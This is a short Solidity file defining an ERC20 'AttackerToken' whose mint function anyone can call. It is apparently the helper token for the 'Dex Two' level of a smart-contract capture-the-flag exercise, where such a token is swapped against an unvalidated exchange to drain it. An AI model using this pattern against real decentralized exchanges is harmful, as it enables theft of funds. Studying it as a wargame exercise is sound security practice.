// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract DexTwoAttacker is ERC20 {
    constructor() public ERC20("AttackerToken", "AT") {
        _mint(msg.sender, 1000);
    }

    function mint(address _to, uint256 amount) public {
        _mint(_to, amount);
    }
}